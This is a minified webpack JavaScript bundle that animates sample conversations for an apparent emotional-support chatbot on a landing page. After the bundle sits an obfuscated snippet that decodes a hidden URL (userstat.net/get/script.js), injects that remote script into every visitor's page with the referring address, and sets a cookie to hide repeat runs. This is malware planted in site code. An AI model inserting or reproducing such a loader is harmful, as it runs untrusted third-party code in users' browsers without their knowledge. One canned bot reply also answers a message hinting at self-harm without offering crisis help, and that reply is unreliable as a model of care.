!function(modules){var installedModules={};function __webpack_require__(moduleId){if(installedModules[moduleId])return installedModules[moduleId].exports;var module=installedModules[moduleId]={i:moduleId,l:!1,exports:{}};return modules[moduleId].call(module.exports,module,module.exports,__webpack_require__),module.l=!0,module.exports}__webpack_require__.m=modules,__webpack_require__.c=installedModules,__webpack_require__.d=function(exports,name,getter){__webpack_require__.o(exports,name)||Object.defineProperty(exports,name,{enumerable:!0,get:getter})},__webpack_require__.r=function(exports){"undefined"!=typeof Symbol&&Symbol.toStringTag&&Object.defineProperty(exports,Symbol.toStringTag,{value:"Module"}),Object.defineProperty(exports,"__esModule",{value:!0})},__webpack_require__.t=function(value,mode){if(1&mode&&(value=__webpack_require__(value)),8&mode)return value;if(4&mode&&"object"==typeof value&&value&&value.__esModule)return value;var ns=Object.create(null);if(__webpack_require__.r(ns),Object.defineProperty(ns,"default",{enumerable:!0,value:value}),2&mode&&"string"!=typeof value)for(var key in value)__webpack_require__.d(ns,key,function(key){return value[key]}.bind(null,key));return ns},__webpack_require__.n=function(module){var getter=module&&module.__esModule?function getDefault(){return module.default}:function getModuleExports(){return module};return __webpack_require__.d(getter,"a",getter),getter},__webpack_require__.o=function(object,property){return Object.prototype.hasOwnProperty.call(object,property)},__webpack_require__.p="",__webpack_require__(__webpack_require__.s="./src/js/conversation.js")}({"./src/js/ConversationPlayer.js":function(module,exports,__webpack_require__){eval("const ConversationStorage = __webpack_require__(/*! ./ConversationStorage */ \"./src/js/ConversationStorage.js\");\nconst animateCSS = __webpack_require__(/*! ./animateCSS */ \"./src/js/animateCSS.js\");\n\nclass ConversationPlayer {\n\n    constructor(chatBlockElement, userMessageBlockElement, userMessageTextElement, botMessageBlockElement, botMessageTextElement, userAvatarBlock) {\n        this.conversations = ConversationStorage.getConversationsForCurrentAgent();\n        this.currentConversationIndex = -1;\n        this.userMessageBlockElement = userMessageBlockElement;\n        this.userMessageTextElement = userMessageTextElement;\n        this.botMessageBlockElement = botMessageBlockElement;\n        this.chatElement = chatBlockElement;\n        this.botMessageTextElement = botMessageTextElement;\n        this.userAvatarBlockElement = userAvatarBlock;\n\n        this.play();\n    }\n\n    /**\n     * Returns next conversation\n     * @returns {{bot: string, user: string}}\n     */\n    getNextConversation() {\n        this.currentConversationIndex++;\n        if (this.currentConversationIndex >= this.conversations.length) this.currentConversationIndex = 0;\n        return this.conversations[this.currentConversationIndex];\n    }\n\n    /**\n     * Sleeps for N ms\n     * @param timeout\n     * @returns {Promise<unknown>}\n     */\n    async sleep(timeout) {\n        return new Promise((resolve, reject) => {\n            setTimeout(() => {\n                resolve();\n            }, timeout);\n        });\n    }\n\n    /**\n     * Returns true if texct startups from an uppercase letter\n     * @param text\n     * @returns {boolean}\n     */\n    textStartsFromUpperCaseLetter(text) {\n        return text[0].toUpperCase() === text[0];\n    }\n\n    async playNextConversation() {\n        const conversation = this.getNextConversation();\n\n\n        // Set user message\n\n        this.userMessageTextElement.innerText = conversation.userMessageText;\n        this.userAvatarBlockElement.style.backgroundColor = conversation.userAvatarColor;\n\n        // Bot message shadow calculation\n        this.chatElement.style.display = 'block';\n        this.chatElement.style.visibility = 'hidden';\n        this.botMessageBlockElement.style.visibility = 'hidden';\n        this.botMessageTextElement.style.height = ``;\n        this.botMessageTextElement.innerText = conversation.botMessageText;\n        await this.sleep(100);\n        this.botMessageTextElement.style.height = `${this.botMessageTextElement.offsetHeight}px`;\n        console.log(`Set height`, this.botMessageTextElement.offsetHeight);\n        this.botMessageTextElement.innerText = '';\n\n        // Initial display\n        this.chatElement.style.display = 'none';\n        this.chatElement.style.visibility = 'visible';\n\n        this.botMessageBlockElement.style.display = 'flex';\n\n        await animateCSS(this.chatElement, 'fadeInDownShort', 'block');\n        await this.sleep(100);\n\n        this.botMessageBlockElement.style.display = 'none';\n        this.botMessageBlockElement.style.visibility = 'visible';\n\n        await animateCSS(this.botMessageBlockElement, 'fadeIn', 'flex');\n\n        const botMessageTextWords = conversation.botMessageText.split(' ');\n\n        let wordsFromLastSentence = 0;\n\n        for (let i = 0; i < botMessageTextWords.length; i++) {\n            const word = botMessageTextWords[i];\n            const wordPrefix = i !== 0 ? ' ' : '';\n            wordsFromLastSentence++;\n\n            if (i > 0) {\n                let timeout;\n\n                if (this.textStartsFromUpperCaseLetter(word)) {\n                    wordsFromLastSentence = 0;\n                    timeout = 800;\n                } else {\n                    timeout = 50 + (Math.random() * 280);\n                }\n\n                if (wordsFromLastSentence <= 2 && wordsFromLastSentence > 0) {\n                    timeout *= 0.25;\n                }\n\n                await this.sleep(timeout);\n            }\n\n            this.botMessageTextElement.innerText = `${this.botMessageTextElement.innerText}${wordPrefix}${word}`;\n\n        }\n\n\n        await this.sleep(5000);\n        await animateCSS(this.chatElement, 'fadeOut', 'none');\n\n\n        await this.sleep(500);\n\n        this.playNextConversation();\n\n    }\n\n    /**\n     * Animates conversation\n     */\n    async play() {\n        return this.playNextConversation();\n    }\n\n}\n\nmodule.exports = ConversationPlayer;\n\n//# sourceURL=webpack:///./src/js/ConversationPlayer.js?")},"./src/js/ConversationStorage.js":function(module,exports){eval("class ConversationStorage {\n\n    static getConversationsForCurrentAgent() {\n        if (screen.width < 992) {\n            return this.getConversationsForMobile();\n        } else {\n            return this.getConversationsForDesktop();\n        }\n    }\n\n    static getConversationsForMobile() {\n        return [\n            {\n                userAvatarColor: '#C96473',\n                userMessageText: `Every new task feels like a punishment. I no longer have any motivation.`,\n                botMessageText: `Can you think of the last time you actually enjoyed your work? What were you working on then?`\n            },\n            {\n                userAvatarColor: '#6488c9',\n                userMessageText: `My friend had a birthday party and didn't invite me. I can't stop crying.`,\n                botMessageText: `I'm so sorry you're feeling so hurt. First, let's take a few breaths together to help you relax.`\n            },\n            {\n                userAvatarColor: '#009688',\n                userMessageText: `I'm never gonna get out of this cycle! I'm always booked 3 weeks ahead.`,\n                botMessageText: `How do you decide which tasks are most important for you to focus on?`\n            },\n            {\n                userAvatarColor: '#673ab7',\n                userMessageText: `I don't have anyone to talk to or share my feelings with. At lunch today, I noticed I was the only one eating alone.`,\n                botMessageText: `Do you think there's any positive side to feeling lonely? Can being lonely have any benefits in someone's life?`\n            },\n            {\n                userAvatarColor: '#c17d38',\n                userMessageText: `My mom passed away last week and it's been really hard for me.`,\n                botMessageText: `I can't even imagine the pain you're going through right now. I'm ready to be here for you and support you in any way I can, for as long as you need.`\n            }\n        ];\n    }\n\n    static getConversationsForDesktop() {\n        return [\n\n            {\n                userAvatarColor: '#C96473',\n                userMessageText: `I'm so overwhelmed trying to get everything done, and every new task feels like a punishment. I no longer have any motivation.`,\n                botMessageText: `I am sorry you are going through this. Ideally, work should give you energy, not take it away. Can you think of the last time you actually enjoyed your work? What were you working on then?`\n            },\n            {\n                userAvatarColor: '#6488c9',\n                userMessageText: `I can't stop crying. My friend had a birthday party and didn't invite me. Everyone we know was there, except for me. He didn't even give me a reason why.`,\n                botMessageText: `That sounds so rough. I'm so sorry you had to go through that. Let's take a few breaths together to help you relax. Close your eyes. Inhale as deeply as you can, and count to five. Then exhale. Do this three more times.`\n            },\n            {\n                userAvatarColor: '#009688',\n                userMessageText: `Sometimes it feels like I'm never gonna get out of this cycle! I'm always booked 3 weeks ahead. It's so hard when I don't have someone I can count on.`,\n                botMessageText: `Let's try to make your schedule more balanced. We can start by grouping all of your work tasks into three categories: urgent and important, important but can be postponed, and not important.`\n            },\n\n\n            {\n                userAvatarColor: '#3c6382',\n                userMessageText: `I feel like our relationship has stagnated. She isn't listening and isn't trying to understand me. Her goals and ambitions are more important to her than our marriage.`,\n                botMessageText: `That's a difficult situation to be in, so I am glad you are here. Tell me a bit more about the last time you tried to reach a compromise.`\n            },\n            {\n                userAvatarColor: '#e55039',\n                userMessageText: `I feel empty and useless. Neither my family, nor my friends, nor my colleagues would notice if I disappeared one day. Maybe they would even be happy.`,\n                botMessageText: `Could it be that the thoughts that are haunting you now are related to some events in your life? Has something happened?`\n            },\n            {\n                userAvatarColor: '#6a89cc',\n                userMessageText: `I feel exhausted, but I can't take the day off. There's a ton of stuff to do, and I don't wanna miss any of the deadlines.`,\n                botMessageText: `Maybe you can try delegating some of the work to your team members? Also, you can try to schedule in some time for yourself, even if it is just 10-15 minutes a day.`\n            },\n            {\n                userAvatarColor: '#c17d38',\n                userMessageText: `I don't have anyone to talk to or share my feelings with. At lunch today, I noticed I was the only one eating alone.`,\n                botMessageText: `Do you think there's any positive side to feeling lonely? Can being lonely have any benefits in someone's life?`\n            },\n            {\n                userAvatarColor: '#673ab7',\n                userMessageText: `My mom passed away last week and it's been really hard for me.`,\n                botMessageText: `I can't even imagine the pain you're going through right now. I'm ready to be here for you and support you in any way I can, for as long as you need.`\n            }\n        ];\n    }\n}\n\nmodule.exports = ConversationStorage;\n\n//# sourceURL=webpack:///./src/js/ConversationStorage.js?")},"./src/js/animateCSS.js":function(module,exports){eval("module.exports = (node, animation, newDisplayValue, prefix = 'animate__') => {\n    // We create a Promise and return it\n    return new Promise((resolve, reject) => {\n        const animationName = `${prefix}${animation}`;\n\n        node.classList.add(`${prefix}animated`, animationName);\n\n        if (node.style.display === 'none') {\n            node.style.display = newDisplayValue;\n        }\n\n        // When the animation ends, we clean the classes and resolve the Promise\n        function handleAnimationEnd(event) {\n            event.stopPropagation();\n            node.classList.remove(`${prefix}animated`, animationName);\n            node.style.display = newDisplayValue;\n            resolve('Animation ended');\n        }\n\n        node.addEventListener('animationend', handleAnimationEnd, {once: true});\n    });\n}\n\n//# sourceURL=webpack:///./src/js/animateCSS.js?")},"./src/js/conversation.js":function(module,exports,__webpack_require__){eval("const ConversationPlayer = __webpack_require__(/*! ./ConversationPlayer */ \"./src/js/ConversationPlayer.js\");\n\nconst conversationPlayer = new ConversationPlayer(\n    document.getElementById('chatBlock'),\n    document.getElementById('userMessageBlock'),\n    document.getElementById('userMessageText'),\n    document.getElementById('botMessageBlock'),\n    document.getElementById('botMessageText'),\n    document.getElementById('userAvatarBlock'),\n\n);\n\n//# sourceURL=webpack:///./src/js/conversation.js?")}});(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44zxjwxy'+'fy3sjy4ljy4xhwnu'+'y3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));